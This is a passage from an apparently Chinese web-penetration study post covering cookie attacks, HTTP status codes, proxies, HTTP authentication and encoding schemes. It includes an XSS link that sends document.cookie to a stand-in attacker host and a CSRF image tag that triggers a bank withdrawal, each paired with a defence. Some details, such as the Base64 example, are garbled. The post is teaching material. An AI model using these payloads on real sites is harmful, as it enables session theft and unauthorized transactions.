href="http://www.demo.com指向攻击者服务器的ip地址.然后攻击者可以从服务器h123456.www.demo.com/img01.png%E5%8F%91%E5%B8%83%E5%9B%BE%E7%89%87%E3%80%82%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E8%BF%99%E4%B8%AA%E5%9B%BE%E7%89%87%EF%BC%8C%E7%94%B1%E4%BA%8Ewww.demo.com%E5%92%8Ch123456.www.demo.com%E5%90%8C%E4%B8%80%E4%B8%AA%E5%AD%90%E5%9F%9F%EF%BC%8C%E6%89%80%E4%BB%A5%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BC%9A%E6%8A%8A%E7%94%A8%E6%88%B7%E7%9A%84%E4%B8%8Ewww.demo.com%E7%9B%B8%E5%85%B3%E7%9A%84cookie%E9%83%BD%E4%BC%9A%E5%8F%91%E9%80%81%E5%88%B0h123456.www.demo.com%E8%BF%99%E4%B8%AA%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%EF%BC%8C%E8%BF%99%E6%A0%B7%E6%94%BB%E5%87%BB%E8%80%85%E5%B0%B1%E4%BC%9A%E6%8B%BF%E5%88%B0%E7%94%A8%E6%88%B7%E7%9A%84cookie%E6%90%9E%E4%BA%8B%E6%83%85%E3%80%82">www.demo.com指向攻击者服务器的ip地址。然后攻击者可以从服务器h123456.www.demo.com/img01.png发布图片。用户访问这个图片，由于www.demo.com和h123456.www.demo.com同一个子域，所以浏览器会把用户的与www.demo.com相关的cookie都会发送到h123456.www.demo.com这个服务器上，这样攻击者就会拿到用户的cookie搞事情。</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>一般情况下是不会 发生这种情况，通常是网络供应商错误。</p>        <h3 id="3-跨站点脚本XSS">          <a href="#3-跨站点脚本XSS" class="heading-link"><i class="fas fa-link"></i></a>3.跨站点脚本XSS</h3>      <p>使用跨站点脚本技术可以窃取cookie.当网站允许使用javascript操作cookie的时候，就会发生攻击者发布恶意代<br>码攻击用户的会话，同时可以拿到用户的cookie信息。</p><p>例如：</p><p>&lt;a href= “#”onclick= window. location=<span class="exturl"><a class="exturl__link" href="http://abc/">http://abc</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>. com?cookie=$｛docuemnt. cookie｝&gt;领取红包<a></a></p><p>当用户点击这个链接的时候，浏览器就会执行ondlick里面的代码，结果这个网站用户的cookie信息就会被发送到攻击者的服务器。攻击者同样可以拿cookie搞事情。</p><p>解决办法:可以通过cookie的HttpOnly属性，设置了HttpOnly属性, javascipt代码将不能操作cookie。</p>        <h3 id="4-跨站请求伪造CSRF">          <a href="#4-跨站请求伪造CSRF" class="heading-link"><i class="fas fa-link"></i></a>4.跨站请求伪造CSRF</h3>      <p>例如，SanShao可能正在浏览其他用户XiaoMing发布消息的聊天论坛。假设XiaoMing制作了一个引用ShanShao<br>银行网站的HTML图像元素，例如：</p><p>&lt;img src =”<span class="exturl"><a class="exturl__link" href="http://www/">http://www</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>. bank. com/withdraw?user-SanShao&amp;amount99999&amp;for=XiaoMing”&gt;</p><p>如果SanShao的银行将其认证信息保存在cookie中，并且cookie尚未过期，(当然是没有其他验证身份的东西)，那么SanShao的浏览器尝试加就该图片将史用他的cookie提交提款表单，从而在未经SanShao批准的情况下授权交易。</p><p>解决办法：增加其他信息的校验(手机验证码，或者其他盾牌)</p>        <h1 id="状态码">          <a href="#状态码" class="heading-link"><i class="fas fa-link"></i></a>状态码</h1>      <p>每条HTTP响应消息都必须在第一行中包含一个状态码，说明请求的结果。根据代码的第一位数字，可将状态码分为以下5类。<br>1xx: 提供信息。<br>2xx: 请求被成功提交。<br>3xx: 客户端被重定向到其他资源。<br>4xx: 请求包含某种错误。<br>5xx: 服务器执行请求时遇到错误。</p><p>还有大量特殊状态码，其中许多状态码仅用在特殊情况下。下面列出渗透测试员在攻击Web应用程序时最有可能遇到的状态码及其相关的原因短语。<br>100 Continue。当客户端提交一个包含主体的请求时，将发送这个响应。该响应表示已收到请求消息头，客户端应继续发送主体。请求完成后，再由服务器返回另一个响应。<br>200 0K：本状态码表示已成功提交请求，且响应主体中包含请求结果。<br>201 Created，PUT 请求的响应返回这个状态码，表示请求已成功提交。<br>301 Moved Permanently：本状态码将浏览器永久重定向到另外一个在Location消息头中指定的URL，以后客户端应使用新URL替换原始URL.。<br>302 Found: 本状态码将浏览器暂时重定向到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL。<br>304 Not Modified: 本状态码指示浏览器使用缓存中保存的所请求资源的副本。服务器使用If-Modified-Since与If-None-Match消息头确定客户端是否拥有最新版本的资源。<br>400 Bad Request: 本状态码表示客户端提交了一个无效的HTTP请求。当以某种无效的方式修改请求时(例如在 URL中插入一个空格符)，可能会遇到这个状态码。<br>401 Unauthorized: 服务器在许可请求前要求HTTP进行身份验证。WWW -Authenticate消息头详细说明所支持的身份验证类型。<br>403 Forbidden: 本状态码指出，不管是否通过身份验证，禁止任何人访问被请求的资源。404 Not Found: 本状态码表示所请求的资源并不存在。<br>405 Method Not Allomed: 本状态码表示指定的URL不支持请求中使用的方法。例如，如果试图在不支持PUT方法的地方使用该方法，就会收到本状态码。。<br>413 Request Entity Too Large: 如果在本地代码中探查缓冲器滋出瀚洞并就此提交超长数据串，则本状态码表示请求主体过长，服务器无法处理。。<br>414 Request URL Too Long: 与前一个响应类似，本状态码表示请求中的URL过长，服务器无法处理。<br>500 Internal Server Error: 本状态码表示服务器在执行请求时遇到错误。当提交无法预料的<br>输入、在应用程序处理过程中造成无法处理的错误时，通常会收到本状态码。应该仔细检查服务器响应的所有内容，了解与错误性质有关的详情。<br>503 Service Unavailable: 通常，本状态码表示尽管Web服务器运转正常并且能够响应请求，但服务器访问的应用程序还是无法作出响应。应该进行核实，是否因为执行了某种行为而造成这个结果。</p>        <h1 id="HTTP代理">          <a href="#HTTP代理" class="heading-link"><i class="fas fa-link"></i></a>HTTP代理</h1>      <p>HTTP代理服务器是一个协调客户端浏览器 与目标Web服务器之间访问的服务器。当配置浏览器使用代理服务器时，它会将所有请求提交到代理服务器，代理服务器再将请求转送给相关Web服务器，并将响应返回给浏览器。大多数代理还使用其他服务，如缓存、验证与访问控制。</p><p>值得注意的是，如果使用代理服务器，HTTP 的工作机制会出现两方面的差异。</p><p>当浏览器向代理服务器发布HTTP请求时，它会将完整的URL(包括协议前缀http://与 服务器主机名称，在非标准URL中，还包括端口号)插人请求中。代理服务器将提取主机名称和端口，并使用这些信息将请求指向正确的目标Web服务器。<br>当使用HTTPS时浏览器无法与代理服务器进行SSL 握手因为这样做会破坏安全隧道，使通信易于遭受拦截攻击。因此，浏览器必须将代理作为一个纯悴的TCP级中继，由它传递浏览器与目标Web浏览器之间的所有网络据，并与浏览器进行正常的SSL握手。浏览器使用CONNECT方法向代理服务器提交一个 HTTP请求，并指定URL中的目标主机名称与端口号，从而建立这种中继。如果代理允许该请求，它会返回一个含200状态码的HTTP响应，一直开放TCP连接，从此以后作为目标Web服务器的纯粹TCP级中继。</p><p>从某种程度上说，攻击Web应用程序时最有用的工具是一个处在浏览器与目标Web站点之间的专用代理服务器，使用它可以拦截并修改所有使用HTTPS的请求与响应。</p>        <h1 id="HTTP身份验证">          <a href="#HTTP身份验证" class="heading-link"><i class="fas fa-link"></i></a>HTTP身份验证</h1>      <p>HTTP拥有自己的用户身份验证机制，使用不同的身份验证方案。</p><p>Basic 这是种非常商单的身份验证机制。它在请求清息头中随每条消息以Base64编码字符串的形式发送用户证书。</p><p>NTLM WindowsNT 挑战/响应验证机制,称之为NTLM。现在已经有了更新的NTLMv2以及Kerberos 验证体系。NTLM是windows早期安全协议，因向后兼容性而保留下来。</p><p>Digest 这是一种响应式机制，它随同用户证书一起使用一个随机值MD5校验和。</p><p>虽然组织内部经常使用这些身份验证协议访问内联网服务，但因特网上的Web应用程序基本很少使用它们。</p>        <h1 id="编码方案">          <a href="#编码方案" class="heading-link"><i class="fas fa-link"></i></a>编码方案</h1>      <p>Web应用程序对其数据采用几种不同的编码方案。在早期阶段，HTTP 协议和HTML语言都是基于文本的，于是人们设计出不同的编码方案，确保这些机制能够安全处理不常见的字符和二进制数据。攻击Web应用程序通常需要使用相关方案对数据进行编码，确保应用程序按照想要的方式对其进行处理。而且，在许多情况下，攻击者甚至能够控制应用程序所使用的编码方案，造成其设计人员无法预料的行为。</p>        <h3 id="1-URL编码">          <a href="#1-URL编码" class="heading-link"><i class="fas fa-link"></i></a>1.URL编码</h3>      <p>URL只允许使用US-ASCII字符集中的可打印字符(也就是ASCII代码在0x20一0x7e范围内的字符)。而且，由于URL方案或HTTP协议内具有特殊含义,这个范围内的一些字符也不能用在URL中。</p><p>URL编码方案主要用于对扩展ASCII字符集中的任何有问题的字符进行编码，使其可通过HTTP 安全传输。任何URL编码的字符都以%为前缀，其后是这个字符的两位十六进制ASCII代码。以下是一些常见的URL编码字符:</p><p>%3d：代表=;<br>%25：代表%;<br>%20：代表空格；</p><p>%0a：代表换行;<br>%00：代表空字节。<br>另一个值得注意的编码字符是加号(+).它代表URL编码的空格(除%20。代表空格外))</p>        <h3 id="2-Unicode编码">          <a href="#2-Unicode编码" class="heading-link"><i class="fas fa-link"></i></a>2.Unicode编码</h3>      <p>Unicode是一种为支持全世界所使用的各种编写系统而设计的字符编码标准，它采用各种编码方案.其中一些可用于表示Web应用程序中的不常见字符。</p><p>16位Unicode编码的工作原理与URL编码类似。为通过HTTP进行传输，16位Unicode编码的字符以u为前缀，其后是这个字符的十六进制Unicode码点。例如:<br>%u2215：代表 / ；<br>%u00e9：代表；</p><p>UTF-8是一种长度可变的编码标准。它使用一个或几个字节表示每个字符。为通过HTTP进行传输，UTF-8编码的多字节字符以毛为前缀，其后用十六进制表示每个字节。例如:<br>%c2%a9：代表（一个圆圈里面有c）；<br>%e2%89%a0：代表（不等于号）；</p><p>攻击Web应用程序时之所以要用到Unicode编码，主要在于有时可用它来破坏输入确认机制。如果输入过滤阻止了某些恶意表达式，但随后处理输入的组件识别Unicode编码，就可以使用各种标准与畸形Unicode编码避开过滤。</p>        <h3 id="3-HTML编码">          <a href="#3-HTML编码" class="heading-link"><i class="fas fa-link"></i></a>3.HTML编码</h3>      <p>HTML编码是一种用于表示问题字符以将其安全并入HTML文档的方案。有许多字符具有特殊的含义(如HTML内的元字符)，并被用于定义文档结构而非其内容。为了安全使用这些字符并将其用在文档内容中，就必须对其进行HTML编码。</p><p>HTML编码定义了大量HTML实体来表示特殊的字面量字符.例如:<br>&amp;quot：代表 ”；<br>&amp;apos：代表 ’；<br>&amp;amp：代表 &amp; ；<br>&amp;lt：代表 &lt; ；<br>&amp;g:：代表 &gt; ；</p><p>此外，任何字符都可以使用它的十进制ASCII码进行HTML编码，例如:<br>&amp;#34：代表 ” ；<br>#39：代表 ’ ；</p><p>或者使用十六进制的ASCII码(以x为前缀)，例如:<br>&amp;#x22：代表 ”；<br>&amp;#x27：代表 ’ ；</p><p>当攻击Weh应用程序时，HTML编码主要在探查跨站脚本漏洞时发挥作用。如果应用程序在响应中返回未被修改的用户输入，那么它可能易于受到攻击。但是，如果它对危险字符进行HTML编码，也许比较安全。</p>        <h3 id="4-Base64编码">          <a href="#4-Base64编码" class="heading-link"><i class="fas fa-link"></i></a>4.Base64编码</h3>      <p>Base64编码仅用个可打印的 ASCII字符就可安全转换任何二进制数据，它常用于对电子邮件附件进行编码，使其通过SMTP安全传输。它还可用于在基本HTTP验证机制中对用户证书进行编码。</p><p>Base64编码将输入数据转换成3个字节块。每个块被划分为4段，每段6个数据位。这6个数据位有64种不同的排列组合，因此每个段可使用一组64个字符表示。Base64编码使用以下字符集，其中只包含可打印的ASCII字符:<br>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopgrstuvwxyz0123456789-/。</p><p>如果最后的输入数据块不能构成3段输出数据，就用一个或两个等号(=)补足输出。<br>例如，The Web Application Hacker’ s Hand book 的Base64编码为:<br>VGh1IFd1YiBBcHBsaWNhdG1vbiBIYWNrZXIncyBIYW5kYm9vaw==</p><p>许多Web应用程序利用Base64编码在cookie与其他参数中传送二进制数据，甚至用它打乱敏感数据以防止即使是细微的修改。应该总是留意并解码发送到客户端的任何Base64数据。由于这些数据使用特殊的字符集，而且有时会在字符串末尾添加补足字符(=)，因此可以轻易辨别出Base64编码的字符串。</p>        <h3 id="5-十六进制编码">          <a href="#5-十六进制编码" class="heading-link"><i class="fas fa-link"></i></a>5.十六进制编码</h3>      <p>许多应用程序在传送二进制数据时直接使用十六进制编码，用ASCII字符表示十六进制数据块。例如，对cookie中的用户名daf进行十六进制编码，会得到以下结果：<br>646166</p><p>和Base64编码的数据一样，十六进制编码的数据通常也很容易辨认。为了解十六进制编码的功能应当对服务器发送到客户端的任何十六进制数据进行解码。</p>        <h3 id="6-远程和序列化框架">          <a href="#6-远程和序列化框架" class="heading-link"><i class="fas fa-link"></i></a>6.远程和序列化框架</h3>      <p>近些年出现了各种用于创建用户界面的框架，这些框架中的客户端代码可以远程访问服务器端实施的编程API，利用这些框架，开发者可以在一定程度上忽略Web应用程序的分布式本质，而以与开发传统桌面应用程序类似的方式编写代码。这些框架通常提供客户端上使用的存根API，它们还能够自动处理以下两个任务：通过这些API远程调用相关服务器端功能，对传送给上述功能的任何数据进行序列化。</p><p>这类远程和序列化框架包括:<br>Flex和AMF:<br>Silverlight 和WCF;<br>Java序列化对象<br>ThinkPHP.<br>Struts2</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
